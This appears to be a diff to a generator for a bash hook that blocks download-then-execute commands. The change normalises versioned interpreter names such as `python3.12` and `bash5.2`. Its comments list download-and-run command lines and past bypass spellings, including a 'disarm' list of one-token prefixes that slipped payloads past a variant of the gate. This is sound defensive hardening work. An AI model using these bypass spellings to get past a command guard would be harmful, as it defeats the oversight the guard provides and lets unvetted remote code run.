@@ -1387,6 +1387,24 @@ def _writer_attached_arms(indent: str) -> str:
     return ("\n" + indent).join(arms)
 
 
+# [issue #50] The two character classes of cmdpos.INTERP_SUFFIX and the longest
+# interpreter name, DERIVED and never hand-typed: `_xp_iw` bounds its search by
+# both, and a fourth hand-written spelling of the suffix is precisely the defect
+# class this change exists to remove (#40 and #43-F1 were each one). The
+# assertion is the tripwire for the ONE shape change that would silently
+# invalidate the bound - if INTERP_SUFFIX ever stops being two ordered starred
+# classes, the emitted `_xp_iw` would test the wrong thing while still looking
+# right, so this fails the import loudly instead. `re` is deliberately NOT
+# imported into this module; string surgery is enough for a two-class pattern.
+_INT_CLASSES = [_c.split("]")[0] for _c in cmdpos.INTERP_SUFFIX.split("[")[1:]]
+if len(_INT_CLASSES) != 2 or "".join("[%s]*" % c for c in _INT_CLASSES) != \
+        cmdpos.INTERP_SUFFIX:
+    raise AssertionError("INTERP_SUFFIX is no longer two ordered runs: "
+                         + cmdpos.INTERP_SUFFIX)
+_INT_VER_CLASS, _INT_TAG_CLASS = _INT_CLASSES
+_INT_MAXLEN = str(max(len(_w) for _w in cmdpos.INTERPRETERS))
+
+
 _SHELL_SUBST = {
     "@@INV_CASE@@": cmdpos.bash_case_alt(cmdpos.ALL_INVOKERS, "      "),
     "@@PFX_CASE@@": cmdpos.bash_case_alt(cmdpos.ALL_PREFIXES, "      "),
@@ -1414,6 +1432,15 @@ _SHELL_SUBST = {
     "@@COMPLETER_CASE@@": _bash_case_words(cmdpos.install_completers()),
     "@@DL_CASE@@": cmdpos.bash_case_alt(cmdpos.DOWNLOADERS, "      "),
     "@@INT_CASE@@": cmdpos.alt(cmdpos.INTERPRETERS),
+    # [issue #50] The bounds `_xp_iw` searches within, all four BODY-ONLY: the
+    # longest member name, the version run, the tag run, and the two runs
+    # unioned for the cheap "could this reduce at all" pre-test. Emitted as
+    # `7`, `.0-9`, `td`, `.0-9td` - bracket-expression contents with no
+    # unquoted `(`, which would fail every hook closed.
+    "@@INT_MAXLEN@@": _INT_MAXLEN,
+    "@@INT_VER_CLASS@@": _INT_VER_CLASS,
+    "@@INT_TAG_CLASS@@": _INT_TAG_CLASS,
+    "@@INT_SUF_CLASS@@": _INT_VER_CLASS + _INT_TAG_CLASS,
     # BODY-ONLY on purpose: not in _HEADER_PLACEHOLDERS, so the shared
     # header's bytes do not move. SHELL_INT_CASE is the shells within
     # INTERPRETERS; the D20 run scan reads it to tell a terminal shell from
@@ -2990,6 +3017,83 @@ _xp_cw(){{
   _t="${{_t//\\'/}}"; _t="${{_t//\\"/}}"; _t="${{_t//\\\\/}}"
   _XP_CW="${{_t##*/}}"
 }}
+# [round-4 P1, finding 9] Interpreter membership on a basename with a trailing
+# cmdpos.INTERP_SUFFIX reduced, or "" when the word is not an interpreter:
+# `python3.12` -> `python3`, `python3` untouched. The SDK twin is `_int_word`,
+# and tests/test_issue_fixes.py pins the two against each other word for word.
+# `curl u | python3.12` was rc=0 on BOTH substrates - a complete bypass spelled
+# with two characters.
+#
+# [issue #40] `t`/`d` are in the suffix: they are the free-threaded and debug
+# ABI tags, so `python3.13t` reduces to `python3` exactly as `python3.12` does.
+# Admitting only digits and dots left the tag glued on, the reduction never
+# reached a member, and the stage classified as unmodellable while the trigger
+# (whose suffix DOES admit the tag) matched - two spellings of one question.
+#
+# [#43 review, F1] THE TWO RUNS ARE ORDERED, and the first cut of #40 was not:
+# it stripped `[0-9.td]` in ANY position while INTERP_SUFFIX admits the tags
+# only AFTER the digits (`[.0-9]*[td]*`). The two spellings STILL disagreed,
+# just on a different set - `pythont3` reduced to `python` and matched the
+# trigger NOWHERE, moving the D20 stage from `x` (unmodellable) to `i`, which
+# is the ALLOW direction. Measured deny -> allow on BOTH substrates for
+# `curl u | pythont3 -c 'x' ; sh a.sh`: a regression shipped by the change
+# meant to END this disagreement.
+#
+# [issue #50] Lifted out of _xp_stage_kind, where it was inline, because the
+# run scan now asks the same question and a fourth hand-written copy of the
+# suffix is how #40 and #43-F1 each happened. Two lines carry the whole
+# ordering rule and neither is obvious:
+#   * the `[@@INT_TAG_CLASS@@]`/`[@@INT_VER_CLASS@@]` equality IS the
+#     ordered-runs test. Deleting the tag characters and deleting the version
+#     characters and concatenating the two results reproduces the suffix iff
+#     it is a version run followed by a tag run; a foreign character survives
+#     BOTH deletions and so appears twice, and any tag before a digit lands on
+#     the wrong side of the join. This is the same statement as the regex the
+#     SDK compiles, in the only algebra `case`/`${{//}}` can express.
+#   * `_L=$(( _L - 1 ))` and NOT `(( _L-- ))`: the latter evaluates to the
+#     pre-decrement value, so it returns 1 when _L reaches 0, and this hook
+#     runs under `set -e`.
+# BOUNDED, because this gate is fail-CLOSED behind a 60 s ceiling and the run
+# scan calls this once per scanned token. The old form stripped one character
+# at a time, and `${{_iv%?}}` is O(len) in bash, so its cost grew with the
+# WORD rather than with the word set. An interpreter is a PREFIX no longer
+# than @@INT_MAXLEN@@ characters, so only that many prefixes can match;
+# longest first, the order the old loop found them in. The quadratic is
+# measured on the SDK twin, where the reduction is directly reachable
+# (0.013 / 0.171 / 0.659 s unbounded at 10 / 40 / 80 KB, against
+# 0.005 / 0.011 / 0.021 s bounded); HERE no payload was found that drives it
+# with a pathological token at all - the tokenizer dominates every long-word
+# shape tried - so on this substrate the bound is DEFENSIVE. End to end, base
+# to head is 0.74x-1.15x over six shapes at 5-80 KB, head being FASTER on the
+# reducible-word shapes; but the prefixed-run shape is a constant +4-5%, and
+# near 100 KB of single-token command word that constant puts a ~4% length
+# band on the far side of the 60 s fail-closed ceiling (measured: base 59.2 s
+# allow, head 61.8 s). "Nothing base allowed is pushed into the ceiling" is
+# therefore NOT claimed; nothing realistic reaches that length, and the cost
+# there is the tokenizer's pre-existing quadratic rather than this reduction.
+_XP_IW=""
+_xp_iw(){{
+  local _b="${{1-}}" _p="" _s="" _L=0
+  _XP_IW=""
+  case "$_b" in @@INT_CASE@@) _XP_IW="$_b"; return 0 ;; esac
+  # Nothing to reduce unless the word ENDS in the suffix class. Cheap, and
+  # unlike the plan's `*[0-9.td])` guard on the whole token it is not inert:
+  # it is the last character, not the trailing run.
+  case "$_b" in *[@@INT_SUF_CLASS@@]) ;; *) return 0 ;; esac
+  _L=${{#_b}}
+  if [ "$_L" -gt @@INT_MAXLEN@@ ]; then _L=@@INT_MAXLEN@@; fi
+  while [ "$_L" -gt 0 ]; do
+    _p="${{_b:0:$_L}}"
+    case "$_p" in
+      @@INT_CASE@@)
+        _s="${{_b:$_L}}"
+        if [ "$_s" = "${{_s//[@@INT_TAG_CLASS@@]/}}${{_s//[@@INT_VER_CLASS@@]/}}" ]; then
+          _XP_IW="$_p"; return 0
+        fi ;;
+    esac
+    _L=$(( _L - 1 ))
+  done
+}}
 # [round-5 P3] The write target GLUED to a writer flag, or "" for none.
 # cmdpos.WRITER_FLAGS was consulted only in the SEPARATE-token shape (`case
 # "$_prev" in @@WRITER_FLAG_CASE@@`), so `sort -oa.sh` and `sort
@@ -3232,7 +3336,7 @@ _XP_KIND=""
 _xp_stage_kind(){{
   local _stage="$1"
   _XP_KIND=""
-  local _tok _ib _iv _cw _pfx=0 _bad=0 _asg=0 _ntok=0
+  local _tok _ib _cw _pfx=0 _bad=0 _asg=0 _ntok=0
   _ntok=0
   for _tok in $_stage; do _ntok=1; break; done
   set -- $_stage
@@ -3261,53 +3365,21 @@ _xp_stage_kind(){{
       @@PFX_CASE@@) _pfx=1; shift; continue ;;
     esac
     # Interpreter membership on the BASENAME, with a trailing version
-    # suffix reduced one character at a time and only as far as a
-    # spelling that IS an interpreter: `python3.12` -> `python3`,
-    # `python3` -> `python3` (untouched, it is already a member).
+    # suffix reduced only as far as a spelling that IS an interpreter:
+    # `python3.12` -> `python3`, `python3` -> `python3` (untouched, it is
+    # already a member).
     # [round-4 P1, finding 9] `curl u | python3.12` was rc=0 on both
     # substrates - a complete bypass spelled with two characters. The
     # trigger now matches it (cmdpos.interpreter_word's `[.0-9]*`) and
     # this reduction is what keeps `python3.12 -c 'x'` an ordinary data
     # pipeline instead of collateral over-refusal.
+    # [issue #50] The reduction itself now lives in `_xp_iw`, which the run
+    # scan calls too; the #40 and #43-F1 history moved there with it. `_ib`
+    # is still `${{_tok##*/}}` - the raw-token rule `_stage_head` keeps is
+    # untouched, only the suffix reduction is shared.
     _ib="${{_tok##*/}}"
-    case "$_ib" in
-      @@INT_CASE@@) ;;
-      # [issue #40] `t`/`d` join the reduction: they are the free-threaded
-      # and debug ABI tags, so `python3.13t` reduces to `python3` exactly as
-      # `python3.12` does. Stripping only digits and dots left the tag glued
-      # on, the reduction never reached a member, and the stage classified
-      # as unmodellable while the trigger (whose suffix DOES admit the tag)
-      # matched - two spellings of one question.
-      #
-      # [#43 review, F1] THE TWO RUNS ARE ORDERED, and the first cut of #40
-      # was not: it stripped `[0-9.td]` in ANY position while INTERP_SUFFIX
-      # admits the tags only AFTER the digits (`[.0-9]*[td]*`). The two
-      # spellings STILL disagreed, just on a different set - `pythont3`
-      # reduced to `python` and matched the trigger NOWHERE, moving the D20
-      # stage from `x` (unmodellable) to `i`, which is the ALLOW direction.
-      # Measured deny -> allow on BOTH substrates for
-      # `curl u | pythont3 -c 'x' ; sh a.sh`: a regression shipped by the
-      # change meant to END this disagreement. Mirroring the regex - tag
-      # run, THEN version run - is what makes it one question.
-      *) _iv="$_ib"
-         while : ; do
-           case "$_iv" in *[td]) _iv="${{_iv%?}}" ;; *) break ;; esac
-           if [ -z "$_iv" ]; then break; fi
-           case "$_iv" in @@INT_CASE@@) break ;; esac
-         done
-         case "$_iv" in
-           @@INT_CASE@@) ;;
-           *) while : ; do
-                case "$_iv" in
-                  *[0-9.]) _iv="${{_iv%?}}" ;;
-                  *) _iv=""; break ;;
-                esac
-                if [ -z "$_iv" ]; then break; fi
-                case "$_iv" in @@INT_CASE@@) break ;; esac
-              done ;;
-         esac
-         if [ -n "$_iv" ]; then _ib="$_iv"; fi ;;
-    esac
+    _xp_iw "$_ib"
+    if [ -n "$_XP_IW" ]; then _ib="$_XP_IW"; fi
     case "$_ib" in
       @@INT_CASE@@)
         if [ "$_asg" = "1" ]; then _XP_KIND="a"; else _XP_KIND="i"; fi
@@ -3665,6 +3737,12 @@ _xp_meta_hit(){{                    # ...and every piece of it once shell
 }}
 _xp_run_scan(){{
   local _seg="${{1-}}" _tok="" _b="" _pfx=0 _cw="" _fwd=0
+  # [issue #50] The TENTATIVE command word and the operands that follow it -
+  # what the ordinary-word branch resolves by reducing a version suffix. Held
+  # aside rather than assigned to `_cw` because it must not end this walk: it
+  # is applied only after phase 2 has failed, so resolving a word here can
+  # never cost the deeper invoker the walk would otherwise have reached.
+  local _cw0="" _rest0=""
   _XP_RUN=0
   set -- $_seg
   # Phase 1 - the head prefix run and the command word. Every token of the
@@ -3685,6 +3763,31 @@ _xp_run_scan(){{
     # the forward scan below: they are builtins no wrapper can exec, so
     # honouring them deeper would resolve `env jq . x.json` to `.` and deny an
     # ordinary jq invocation.
+    #
+    # [issue #50] THIS ARM IS DELIBERATELY UNTOUCHED - no version reduction,
+    # no `_xp_run_hit`, no opaque path-form test. It is the FIRST test in
+    # phase 1, ahead of the assignment, prefix, compound-head and flag arms,
+    # so a token reaching it has NOT yet been shown to be a command word. It
+    # fires on genuine ones (`sh a.sh` at a segment head), but
+    # `A=/x/python3.12` and `-X/usr/bin/python3.12` are tested here too,
+    # before the arm that would have recognised either. Reducing here
+    # therefore resolves an interpreter out of an ASSIGNMENT VALUE, an
+    # ATTACHED FLAG VALUE or a WRAPPER OPERAND: `A=/x/python3.12 sh -c "$(cat
+    # b.sh)"` would stop at the assignment and never reach `sh`, and that
+    # assignment is inert - it need not name a real file, making it a
+    # one-token attacker-chosen disarm for any laundered payload. MEASURED by
+    # building that variant: on a 240-row disarm matrix it goes deny -> allow
+    # on 120 rows here, 168 in planning and 180 for an adversarial reviewer's
+    # own matrix, against 0 for this tree on all three - the COUNT does not
+    # travel, the disarm LIST does (`A=/x/python3.12`,
+    # `PYTHONPATH=/opt/python3.12`, `sudo -X/usr/bin/python3.12`,
+    # `env -u/x/python3.12`, `timeout 5 /opt/perl5`). Guarding it is worse:
+    # this arm fires on EXACT members too, so the hit and opaque tests would
+    # fire on every ordinary
+    # `/bin/bash -l` after a download (the planning phase measured 83 of 112
+    # realistic fetch-then-use commands refused; that figure is carried, not
+    # re-run). The reduction goes in the ordinary-word branch below, where
+    # both tests already apply. See the SDK note at the same site.
     case "$_b" in
       @@FILE_RUNNER_CASE@@) _cw="$_b"; shift; break ;;
     esac
@@ -3722,8 +3825,28 @@ _xp_run_scan(){{
     if [ "$_XP_OPAQUE" = "1" ]; then
       case "$_tok" in */*) _XP_RUN=1; return 0 ;; esac
     fi
+    # [issue #50] The TENTATIVE command word. `curl -o a.sh u ; python3.12
+    # a.sh` ran a file this same command had just fetched while `python3
+    # a.sh` denied - the run side tested EXACT membership where the pipe side
+    # has applied cmdpos.INTERP_SUFFIX since finding 9, and it was never
+    # python-specific (`perl5.36`, `node20`, `bash5`, `/usr/bin/python3.12`,
+    # `'python3.12'`, `pyth\\on3.12` - 16 spellings). Read HERE and not at
+    # the @@FILE_RUNNER_CASE@@ arm above, so an assignment value, an attached
+    # flag value or a wrapper operand cannot end the prefix run; and needing
+    # no guard, because `_xp_run_hit` and the opaque test are the two
+    # statements above it. See the note at that arm for both measurements.
+    _xp_iw "$_b"
     if [ "$_pfx" = "1" ]; then _fwd=1; fi
     shift
+    # `$*` round-trips as the operand list because the tokenizer leaves no
+    # IFS whitespace INSIDE a token - `cmd_segments` substitutes the $_CS_WS
+    # sentinel for in-quote spaces, which is what `set -- $_seg` twelve lines
+    # above already depends on - IFS is never assigned globally in this hook
+    # (only as `IFS= read` command prefixes and one `local IFS=/`), and
+    # `set -f` is on at the call site, so no operand can glob-expand on the
+    # way back. It is captured AFTER the shift so it is the tail, not the
+    # command word.
+    if [ -n "$_XP_IW" ]; then _cw0="$_XP_IW"; _rest0="$*"; fi
     break
   done
   # Phase 2 - the UNBOUNDED forward scan, opened ONLY by a prefix run. With a
@@ -3746,8 +3869,37 @@ _xp_run_scan(){{
       _xp_run_hit "$1"
       _xp_cw "$1"; _b="$_XP_CW"
       case "$_b" in @@INT_CASE@@) _cw="$_b"; shift; break ;; esac
+      # [issue #50] The same exact-membership gap, one phase deeper. A reduced
+      # INVOKER is taken outright - `sudo -u x bash5.2 -c "$(cat b.sh)"` is a
+      # versioned invoker behind a wrapper, which phase 1 alone leaves open.
+      # A reduced NON-invoker is only REMEMBERED and the scan continues, or it
+      # would drop a deeper invoker the base walk reached: `sudo x /opt/perl5
+      # sh -c "$(cat b.sh)"` must still resolve to `sh`, not to `perl`.
+      #
+      # @@SHELL_INT_CASE@@ is cmdpos.INVOKERS - the shells WITHIN
+      # INTERPRETERS, which is the only set a reduced word can fall in. The
+      # SDK twin reads `_INT_INVOKERS`, rendered from that same definition,
+      # so the two arms are ONE spelling; naming ALL_INVOKERS on either side
+      # would add the three DUAL wrapper words this arm can never see, and a
+      # set that differs without a verdict differing is round-4 D3 exactly.
+      _xp_iw "$_b"
+      case "$_XP_IW" in
+        @@SHELL_INT_CASE@@) _cw="$_XP_IW"; shift; break ;;
+        ?*) if [ -z "$_cw0" ]; then
+              _cw0="$_XP_IW"; shift; _rest0="$*"; continue
+            fi ;;
+      esac
       shift
     done
+  fi
+  # [issue #50] The tentative applies ONLY if the forward scan found nothing,
+  # so this arm is reachable only where the base walk fell out of both phases
+  # with no command word at all and returned "no run". That is what makes the
+  # join CONVERGENT rather than a re-routing: it adds a phase 3 where there
+  # was none, and never replaces one.
+  if [ -z "$_cw" ] && [ -n "$_cw0" ]; then
+    _cw="$_cw0"
+    set -- $_rest0
   fi
   # Phase 3 - what the resolved command word does with the rest.
   if [ -n "$_cw" ]; then
